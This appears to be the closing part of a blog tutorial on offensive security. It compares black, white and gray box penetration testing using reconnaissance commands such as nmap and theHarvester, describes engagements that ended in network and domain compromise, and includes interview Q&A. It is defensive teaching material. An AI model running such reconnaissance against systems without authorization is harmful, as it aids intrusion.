**Example Scenario:**
'Test our perimeter security. We'll give you our company name. Show us what an attacker could find.'

**Methodology:**
```bash
# Start from scratch
whois target.com
dnsdork -d target.com
theHarvester -d target.com -b all
nmap -sV target.com
# Discover everything through reconnaissance
```

**Advantages:**
- Most realistic attack simulation
- Tests detection capabilities
- Identifies information leakage
- Validates perimeter defenses
- Shows real-world attacker view

**Disadvantages:**
- Time-consuming (lots of recon)
- May miss internal vulnerabilities
- Can be expensive due to time
- Limited coverage within timeline
- May trigger security alerts

**Best Used For:**
- External penetration tests
- Red team engagements
- Compliance testing (PCI-DSS external scan)
- Initial security assessment

**Real Example:**
In my last black box engagement:
- Week 1: Reconnaissance (found 47 subdomains, 12 email formats)
- Week 2: Vulnerability scanning (identified outdated VPN)
- Week 3: Exploitation (compromised VPN, pivoted internal)
- Result: Full network compromise from zero knowledge

**White Box Testing**

**Definition:**
Full knowledge approach. Complete access to all information.

**Information Provided:**
- Network diagrams
- Source code repository
- Architecture documents
- Admin credentials
- Configuration files
- Previous test results

**Example Scenario:**
'We're launching a new application. Review the code, test the infrastructure, find everything before attackers do.'

**Methodology:**
```bash
# Start with code review
git clone internal-repo
# Static analysis
bandit -r . -o report.json
# Manual code review for logic flaws
# Dynamic testing with full knowledge
```

**Advantages:**
- Comprehensive coverage
- Finds more vulnerabilities
- Tests business logic
- Efficient use of time
- Better for complex applications
- Validates security controls

**Disadvantages:**
- Less realistic attacker simulation
- Doesn't test detection
- May find theoretical vs practical issues
- Requires code review skills

**Best Used For:**
- Pre-deployment security review
- Source code security audit
- Complex application testing
- Merger & acquisition due diligence
- Secure development lifecycle integration

**Real Example:**
For a fintech client:
- Received: Full source code, AWS architecture, API documentation
- Found: SQL injection in admin panel, hardcoded AWS keys, logic flaw in transaction processing
- Timeline: 2 weeks vs 6-8 weeks black box
- Result: 47 findings including 5 critical, all fixed before launch

**Gray Box Testing**

**Definition:**
Partial knowledge. Simulates insider threat or compromised user.

**Information Provided:**
- Low-privilege user credentials
- Basic network information
- Sometimes: high-level architecture
- No source code
- No admin access

**Example Scenario:**
'We want to test what damage a malicious employee or compromised account could cause.'

**Methodology:**
```bash
# Start as authenticated user
# Enumerate permissions
# Test privilege escalation
# Attempt lateral movement
# Identify sensitive data access
```

**Advantages:**
- Balanced approach
- Realistic insider threat simulation
- Tests internal security controls
- More efficient than black box
- Tests privilege escalation
- Good coverage vs time ratio

**Disadvantages:**
- May miss external attack vectors
- Depends on access level provided
- Not true black box simulation

**Best Used For:**
- Internal penetration tests
- Insider threat assessment
- Web application testing (authenticated)
- Active Directory security review
- Post-exploitation assessment

**Real Example:**
Corporate network assessment:
- Provided: Domain user credentials, VPN access
- Found: Kerberoasting vulnerable accounts → Domain Admin in 4 hours
- Showed: Any employee could compromise entire domain
- Result: Implemented tiered admin model, disabled Kerberoastable SPNs

**Comparison Table:**

| Aspect | Black Box | Gray Box | White Box |
|--------|-----------|----------|-----------|
| **Realism** | High | Medium | Low |
| **Coverage** | Low | Medium | High |
| **Time** | Longest | Medium | Shortest |
| **Cost** | Highest | Medium | Lowest |
| **Code Review** | No | No | Yes |
| **Detection Testing** | Yes | Partial | No |
| **Insider Threat** | No | Yes | N/A |

**My Recommendation by Scenario:**

**Startup launching web app:**
White box - Find everything before launch

**Enterprise annual assessment:**
Gray box - Test internal security controls

**Red team exercise:**
Black box - Realistic attack simulation

**PCI-DSS compliance:**
Black box external + White box internal

**Post-breach assessment:**
Gray box - Assume attacker has user credentials

**Hybrid Approach:**

I often recommend combining methods:

**Phase 1:** Black box external (1 week)
- Simulate external attacker
- Test perimeter defenses

**Phase 2:** Gray box internal (2 weeks)
- Use credentials found in phase 1
- Test internal security
- Attempt privilege escalation

**Phase 3:** White box critical apps (1 week)
- Code review of high-risk applications
- Deep dive into business logic
- Validate fixes from phases 1-2

This gives complete coverage: external attack surface, internal security posture, and comprehensive code review.

**The key is matching the testing approach to the objective, not defaulting to one method for all scenarios.**"

**Follow-up Questions:**

Q: "If time is limited, which approach provides the most value?"
A: "For most organizations, gray box provides the best ROI. You simulate the most common threat (compromised account), test internal controls, and achieve good coverage efficiently. Black box is necessary for perimeter testing, but internal compromise is usually the bigger risk."

Q: "How do you handle a situation where white box testing reveals vulnerabilities that can't be exploited without source code?"
A: "I classify these separately as 'Source Code Review Findings' vs 'Penetration Test Findings.' I explain that while they may not be immediately exploitable, they represent design flaws or technical debt that should be addressed to prevent future issues. I prioritize based on exploitability, but document all findings."

**Certification Relevance:** CEH Methodology, OSCP Testing Approach, GPEN

---

[End of Interview Questions]

## Summary and Final Recommendations

**Congratulations!** You've completed Part 2: Offensive Security & Ethical Hacking.

**Skills Mastered:**
✅ Comprehensive reconnaissance (passive and active)
✅ Vulnerability assessment and exploitation
✅ OWASP Top 10 with practical implementation
✅ Active Directory attack chains
✅ Privilege escalation (Windows & Linux)
✅ Wireless network penetration
✅ Mobile application security
✅ Social engineering tactics
✅ Post-exploitation and persistence
✅ Professional reporting

**Certification Readiness:**
- CEH: 95% coverage
- OSCP: Complete methodology
- Security+: Attack techniques
- CISSP: Security testing domain

**Next Steps:**
1. Practice in labs (HackTheBox, TryHackMe)
2. Participate in CTF competitions
3. Contribute to bug bounty programs
4. Pursue certifications
5. Build your professional network

Remember: **Use this knowledge responsibly and ethically!**
{% endraw %}

---

**Series navigation:** [🛡️ Landing page](/posts/cybersecurity_mastery_landing_page/) · [📑 Table of contents](/posts/cybersecurity_mastery_toc/)

- Previous: [← Cybersecurity Mastery - Part 1: Security Fundamentals, SDLC Security & DevSecOps](/posts/cybersecurity_mastery_part1_sdlc_security_devsecops/)
- Next: [Cybersecurity Mastery - Part 3: Digital Forensics & Incident Response (DFIR) →](/posts/cybersecurity_mastery_part3_digital_forensics_incident_response/)
